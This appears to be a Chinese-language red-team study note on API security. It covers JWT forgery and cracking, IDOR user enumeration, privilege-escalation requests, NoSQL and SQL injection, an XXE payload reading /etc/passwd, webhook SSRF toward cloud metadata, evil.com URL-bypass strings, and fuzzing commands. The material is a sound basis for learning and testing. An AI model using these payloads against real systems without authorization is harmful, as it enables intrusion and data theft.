## 目录

- [[#一、API攻击面全景|一、API攻击面全景]]
- [[#二、API认证绕过|二、API认证绕过]]
- [[#三、API授权缺陷|三、API授权缺陷]]
- [[#四、数据泄露与过度暴露|四、数据泄露与过度暴露]]
- [[#五、API注入攻击|五、API注入攻击]]
- [[#六、Webhook与回调安全|六、Webhook与回调安全]]
- [[#七、API安全测试工具链|七、API安全测试工具链]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、API攻击面全景

### API漏洞分类（OWASP API Top 10）

| # | 漏洞 | 说明 |
|---|------|------|
| API1 | Broken Object Level Authorization | IDOR：越权访问对象 |
| API2 | Broken Authentication | 认证机制缺陷 |
| API3 | Broken Object Property Level Authorization | 批量赋值/属性越权 |
| API4 | Unrestricted Resource Consumption | 资源滥用（DoS） |
| API5 | Broken Function Level Authorization | 功能级别越权 |
| API6 | Unrestricted Access to Sensitive Business Flows | 业务逻辑滥用 |
| API7 | Server Side Request Forgery | SSRF |
| API8 | Security Misconfiguration | 安全配置错误 |
| API9 | Improper Inventory Management | API资产不清 |
| API10 | Unsafe Consumption of APIs | 不安全使用第三方API |

## 二、API认证绕过

### JWT攻击技术

```bash
# 1. alg:none 攻击
# 原始JWT（HS256签名）
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature

# 修改header的alg为"none"
echo '{"alg":"none","typ":"JWT"}' | base64
ew0KICAiYWxnIjogIm5vbmUiLA0KICAidHlwIjogIkpXVCI...

# 服务器可能接受"none"算法 → 无需签名验证！

# 2. 密钥混淆 (HMAC vs RSA)
# JWT用RSA公钥签名，但攻击者：
# - 获取公钥（通常可以从 /.well-known/jwks.json 获取）
# - 将 alg 从 RS256 改为 HS256
# - 用公钥做HMAC-SHA256签名
# - 如果服务器用公钥验证HS256 → 签名通过！

# 3. 弱密钥暴力破解
hashcat -m 16500 jwt.txt rockyou.txt  # JWT HS256破解
```

### JWT攻击工具

```bash
# jwt_tool.py
python3 jwt_tool.py <jwt>                  # 分析JWT
python3 jwt_tool.py <jwt> -T               # 篡改测试
python3 jwt_tool.py <jwt> -X a             # alg:none攻击
python3 jwt_tool.py <jwt> -X s             # 签名攻击
python3 jwt_tool.py <jwt> -X k -pk key.pem # 密钥混淆

# jwt-cracker (暴力破解JWT密钥)
npx jwt-cracker 'eyJ...' 'abcdefghijklmnopqrstuvwxyz' 6
```

### OAuth 2.0攻击

```
1. CSRF via state参数缺失 → 绑定攻击者OAuth账号
2. redirect_uri未严格验证 → 授权码劫持
3. Implicit Flow → Token在URL中泄露
4. 弱code_challenge → PKCE绕过
5. Access Token在JS中 → XSS可窃取
```

## 三、API授权缺陷

### 水平越权 (IDOR)

```bash
# 枚举用户
for i in $(seq 1 1000); do
  curl -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/$i" | jq '.email'
done
```

### 垂直越权

```bash
# 普通用户尝试管理员端点
curl -H "Authorization: Bearer $USER_TOKEN" \
  https://target.com/api/admin/users  # ← 普通用户访问管理API

# 如果返回200 → 垂直越权

# 通过参数提升
curl -X POST https://target.com/api/profile \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"role":"admin"}'  # ← 尝试修改自己的角色
```

## 四、数据泄露与过度暴露

### API响应中的信息泄露

```json
// 登录成功响应
{
  "message": "Login successful",
  "user": {
    "id": 1,
    "username": "admin",
    "passwordHash": "$2b$10$...",  // ← 密码Hash不应返回！
    "resetToken": "abc123def456",    // ← 重置Token不应暴露
    "ssn": "123-45-6789",           // ← SSN不应返回
    "role": "admin",
    "apiKeys": {
      "stripe": "sk_live_xxxx"       // ← API密钥不应暴露
    }
  }
}
```

### Debug端点泄露

```
# 常见debug模式端点
/api/debug/pprof
/actuator              # Spring Boot Actuator
/actuator/env          # 环境变量（含密钥）
/actuator/heapdump     # 内存dump
/api/debug/vars
/info                  # 应用版本信息
/.env                  # 环境文件
/phpinfo.php           # PHP信息
```

## 五、API注入攻击

### JSON注入

```json
// 基本注入
{ "search": "admin' OR '1'='1" }

// NoSQL注入（MongoDB）
{ "username": "admin", "password": { "$ne": "" } }
// 匹配 password != "" → 绕过密码验证！始终true

{ "username": { "$regex": "^admin" }, "password": { "$gt": "" } }

// MongoDB $where注入
{ "search": "1; sleep(5000)" }
```

### GraphQL特定注入

```graphql
# 见上一节
query { user(id: "1 OR 1=1") { name } }
```

### XML注入 (XXE)

```xml
POST /api/parse-xml
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

## 六、Webhook与回调安全

### Webhook SSRF

```
很多API支持Webhook/回调URL：

POST /api/webhooks
{ "url": "http://169.254.169.254/latest/meta-data/", "events": ["order.created"] }

不要直接给公网URL！
先尝试 → AWS元数据端点 (169.254.169.254)
         内网服务端口
         本地文件系统 (file:///etc/passwd)
```

### Webhook请求走私

```
如果Webhook验证了回调URL的域名但请求可被操纵：

输入：https://trusted.com/user/upload
实际：https://trusted.com/user/upload#@evil.com
      https://trusted.com.evil.com/phishing
      https://trusted.com@evil.com
```

## 七、API安全测试工具链

### 自动化发现

```bash
# 1. API端点发现
ffuf -w api_wordlist.txt -u https://target.com/FUZZ
feroxbuster -u https://target.com/api -w api_endpoints.txt

# 2. 参数发现
arjun -u https://target.com/api/users
# 自动发送大量payload发现隐藏参数

# 3. GraphQL
# 见上一节 inQL / clairvoyance

# 4. Swagger/OpenAPI提取
curl https://target.com/swagger.json | jq '.paths | keys'
```

### 自动化测试

```bash
# 1. Postman + Newman
newman run api_tests.postman_collection.json

# 2. 自动化IDOR检测
# Burp Suite + Autorize插件

# 3. API Fuzzing
ffuf -request api_request.txt -w fuzz_params.txt \
  -mode clusterbomb

# 4. JWT测试
python3 jwt_tool.py -t https://target.com/api -rh "Authorization: Bearer JWT" \
  -M at -cv "Welcome" -T
```

### CI/CD中的API测试

```yaml
# GitHub Actions 示例
- name: API Security Scan
  run: |
    # OWASP ZAP API Scan
    zap-api-scan.py -t openapi.json -f openapi -r zap_report.html
    
    # 自定义JWT检查
    python3 check_jwt.py --url https://staging.target.com/api
```

## 八、红队视角总结

### API攻击流程

```
1. 发现API端点 (Web/App/Mobile流量分析)
2. 获取API文档 (Swagger/GraphQL内省)
3. 理解认证机制 (JWT/OAuth/API Key)
4. 测试认证绕过 (alg:none/密钥混淆/过期token)
5. 测试授权缺陷 (IDOR/垂直越权)
6. 参数fuzzing (污染/类型混淆/注入)
7. 业务逻辑利用 (批量伪造/竞态/Webhook SSRF)
8. 提升影响 (RCE/数据泄露/账户接管)
```

### 完整的API测试工具包

| 功能 | 工具 |
|------|------|
| API发现 | ffuf, feroxbuster, Kiterunner |
| 文档分析 | Swagger Parser, Burp OpenAPI Parser |
| GraphQL | InQL, GraphQLmap, clairvoyance |
| JWT攻击 | jwt_tool, jwt-cracker |
| 参数发现 | Arjun, Param Miner(Burp) |
| 自动化扫描 | ZAP, Nuclei (api templates) |
| IDOR检测 | Autorize (Burp) |
| Fuzzing | ffuf, Burp Intruder |

---
**返回** [[../前端基础总目录|前端基础总目录]]
